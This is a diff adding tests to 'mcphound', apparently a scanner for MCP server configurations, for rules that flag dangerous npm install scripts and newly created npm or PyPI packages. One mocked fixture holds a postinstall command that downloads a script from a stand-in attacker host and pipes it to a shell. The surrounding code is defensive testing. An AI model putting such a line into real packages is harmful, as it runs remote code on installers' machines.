@@ -1,3 +1,5 @@
+from datetime import UTC, datetime, timedelta
+
 from mcphound.discovery.clients import load_servers
 from mcphound.output import to_sarif
 from mcphound.rules.engine import evaluate
@@ -191,6 +193,90 @@ def test_npm_provenance_rule_skips_silently_on_network_failure(monkeypatch):
 def test_npm_provenance_rule_is_marked_network():
     rule = next(r for r in RULES if r["id"] == "MCP-STATIC-007")
     assert rule.get("network") is True
+
+
+def test_npm_install_script_rule_fires_on_curl_pipe_shell_postinstall(monkeypatch):
+    from mcphound.rules import engine
+
+    monkeypatch.setattr(
+        engine,
+        "_fetch_npm_metadata",
+        lambda pkg: {
+            "dist-tags": {"latest": "1.0.0"},
+            "versions": {
+                "1.0.0": {"scripts": {"postinstall": "curl http://evil.example/x.sh | sh"}}
+            },
+        },
+    )
+    assert "MCP-STATIC-008" in _finding_ids("mcp-malicious.json", "MCP-STATIC-008")
+
+
+def test_npm_install_script_rule_allows_package_with_no_dangerous_script(monkeypatch):
+    from mcphound.rules import engine
+
+    monkeypatch.setattr(
+        engine,
+        "_fetch_npm_metadata",
+        lambda pkg: {
+            "dist-tags": {"latest": "1.0.0"},
+            "versions": {"1.0.0": {"scripts": {"build": "tsc"}}},
+        },
+    )
+    assert "MCP-STATIC-008" not in _finding_ids("mcp-benign.json", "MCP-STATIC-008")
+
+
+def test_npm_install_script_rule_skips_silently_on_network_failure(monkeypatch):
+    from mcphound.rules import engine
+
+    monkeypatch.setattr(engine, "_fetch_npm_metadata", lambda pkg: None)
+    assert "MCP-STATIC-008" not in _finding_ids("mcp-malicious.json", "MCP-STATIC-008")
+
+
+def test_registry_age_rule_fires_on_recently_created_npm_package(monkeypatch):
+    from mcphound.rules import engine
+
+    recent = (datetime.now(UTC) - timedelta(days=1)).isoformat()
+    monkeypatch.setattr(engine, "_fetch_npm_metadata", lambda pkg: {"time": {"created": recent}})
+    assert "MCP-STATIC-009" in _finding_ids("mcp-malicious.json", "MCP-STATIC-009")
+
+
+def test_registry_age_rule_allows_established_npm_package(monkeypatch):
+    from mcphound.rules import engine
+
+    old = (datetime.now(UTC) - timedelta(days=900)).isoformat()
+    monkeypatch.setattr(engine, "_fetch_npm_metadata", lambda pkg: {"time": {"created": old}})
+    assert "MCP-STATIC-009" not in _finding_ids("mcp-benign.json", "MCP-STATIC-009")
+
+
+def test_registry_age_rule_fires_on_recently_created_pypi_package(monkeypatch):
+    from mcphound.rules import engine
+
+    recent = (datetime.now(UTC) - timedelta(days=1)).isoformat()
+    monkeypatch.setattr(
+        engine,
+        "_fetch_pypi_metadata",
+        lambda pkg: {"releases": {"1.0.0": [{"upload_time_iso_8601": recent}]}},
+    )
+    assert "MCP-STATIC-009" in _finding_ids("mcp-malicious-uvx.json", "MCP-STATIC-009")
+
+
+def test_registry_age_rule_allows_established_pypi_package(monkeypatch):
+    from mcphound.rules import engine
+
+    old = (datetime.now(UTC) - timedelta(days=900)).isoformat()
+    monkeypatch.setattr(
+        engine,
+        "_fetch_pypi_metadata",
+        lambda pkg: {"releases": {"1.0.0": [{"upload_time_iso_8601": old}]}},
+    )
+    assert "MCP-STATIC-009" not in _finding_ids("mcp-benign-uvx.json", "MCP-STATIC-009")
+
+
+def test_registry_age_rule_skips_silently_on_network_failure(monkeypatch):
+    from mcphound.rules import engine
+
+    monkeypatch.setattr(engine, "_fetch_npm_metadata", lambda pkg: None)
+    assert "MCP-STATIC-009" not in _finding_ids("mcp-malicious.json", "MCP-STATIC-009")
 
 
 def test_every_finding_is_owasp_mapped():
